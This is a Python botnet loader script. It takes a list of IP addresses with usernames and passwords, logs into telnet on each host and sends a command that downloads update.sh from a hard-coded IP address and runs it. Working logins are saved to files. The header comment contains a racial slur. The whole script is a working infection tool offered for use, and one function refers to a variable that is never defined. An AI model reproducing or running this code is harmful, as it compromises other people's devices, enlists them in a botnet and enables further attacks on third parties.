#!/usr/bin/python3
# Fast As Fuck Nigga By Sleep

import sys
import os
import paramiko
import socket
from threading import Thread
from time import sleep

if len(sys.argv) < 2:
    sys.exit("\033[37mUsage: python3 " + sys.argv[0] + " [vuln list]")

paramiko.util.log_to_file("/dev/null")
rekdevice = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.82.70.225/update.sh; busybox wget http://80.82.70.225/update.sh; chmod 777 update.sh; sh update.sh; rm -f update.sh"
print("\033[31m")

print("S-S-SUUUPER fast telnet loader by Milenko")
print("\nReads ip:user:pass and checks IP for port 23.")
print("Then loads the botnet onto it and saves logins with SSH running to 'telnetopen.txt'")
print("It is VERY fast and extremely efficient.")
print("As it splits the file into equal chunks for each thread!")

threads = int(input("Threads: "))

# Open the file in binary mode and decode lines, ignoring errors
with open(sys.argv[1], "rb") as f:
    lines = [line.decode("utf-8", errors="ignore").strip() for line in f.readlines()]

fh = open("telnetopen.txt", "a+")
working_fh = open("working.txt", "a+")  # Open working.txt to save successful logins

def chunkify(lst, n):
    return [lst[i::n] for i in range(n)]

running = 0
loaded = 0

def printStatus():
    global loaded
    while True:
        sleep(10)
        print("\033[32m[\033[31m+\033[32m] Total IPs loaded: " + str(loaded) + "\033[37m")
        if loaded >= 1000:
            print("Dayum u got sum phat hax brah :^}")

def haxit(ip, username, password):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, 23))

        # Sending username
        s.recv(1024)  # Wait for "username" prompt
        s.sendall((username + "\n").encode("ascii"))

        # Sending password
        s.recv(1024)  # Wait for "password" prompt
        s.sendall((password + "\n").encode("ascii"))

        # Check for prompt symbol to confirm access
        prompt = s.recv(1024)
        if b"$" in prompt or b"#" in prompt:
            s.sendall((rekdevice + "\n").encode("ascii"))
            print("\033[32m[\033[31m+\033[32m] Command Sent: " + ip + "\033[37m")
            working_fh.write(login + "\n")  # Save working login to working.txt
            working_fh.flush()  # Ensure the data is written to the file
        s.close()
    except Exception as e:
        pass

def check(chunk, fh):
    global running, loaded
    running += 1
    threadID = running
    for login in chunk:
        if login.startswith("DUP"):
            continue

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.37)
        try:
            ip, username, password = login.split(":")
            s.connect((ip, 23))
            s.close()
            print("\033[32m[\033[31m+\033[32m] " + login + " has telnet open. Loading...")
            haxit(ip, username, password)
            fh.write(login + "\n")
            fh.flush()
            loaded += 1
        except Exception as e:
            pass
    print("\033[32m[\033[31m+\033[32m] Thread " + str(threadID) + " has finished scanning " + str(len(chunk)) + " IPs. Loaded: " + str(loaded))
    running -= 1

chunks = chunkify(lines, threads)

print("STARTING SCAN AND LOAD!!!")
Thread(target=printStatus).start()

for thread in range(threads):
    try:
        Thread(target=check, args=(chunks[thread], fh)).start()
    except:
        pass

print("Scanning... Press enter 3 times to stop.")
for _ in range(3):
    input()

fh.close()
working_fh.close()  # Close the working logins file
os.system("kill -9 " + str(os.getpid()))
